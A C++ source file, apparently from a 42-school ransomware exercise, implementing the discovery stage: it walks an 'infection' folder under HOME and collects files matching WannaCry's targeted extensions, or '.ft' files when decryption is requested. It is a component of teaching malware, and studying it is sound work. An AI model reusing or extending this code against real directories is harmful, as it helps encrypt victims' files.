/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Discovering.cpp                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: luluzuri <luluzuri@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/07/04 11:12:53 by luluzuri          #+#    #+#             */
/*   Updated: 2026/07/06 15:17:41 by luluzuri         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "Discovering.hpp"
#include "extensions.hpp"
#include "Utils.hpp"

#include <cstddef>
#include <cstdlib>
#include <cstring>
#include <filesystem>
#include <vector>

namespace fs = std::filesystem;

Discovering::Discovering(int &option_field) {
	this->getenv_result = std::getenv(this->home.c_str());
	if (this->getenv_result == nullptr) {
		std::cout << "Error: getenv failed ( " << this->home << " not found )"
				  << std::endl;
		exit(1);
	}
	this->complete_path = this->getenv_result + this->infection_folder_name;
	if (!fs::exists(this->complete_path)) {
		std::cerr << "folder infection not existing (" << this->complete_path << ")" << std::endl;
		exit(1);
	}

	try {
		const auto ext_set = wannacry_extensions();
		for (const fs::directory_entry &entry :
			 fs::recursive_directory_iterator(this->complete_path)) {

			if (!entry.is_regular_file()) continue;

			if ((option_field & OPT_REVERSE) != 0) {
				if (entry.path().extension().string() == ".ft")
					this->final_paths_vector.push_back(entry);
			} else {
				if (ext_set.find(entry.path().extension().string()) !=
					ext_set.end())
					this->final_paths_vector.push_back(entry);
			}
		}
	} catch (const std::filesystem::filesystem_error &e) {
		std::cerr << "FileSystemError: directory not found" << std::endl;
		exit(1);
	}
}

std::vector<std::filesystem::directory_entry> Discovering::getFinalPaths(void) {
	return (this->final_paths_vector);
}
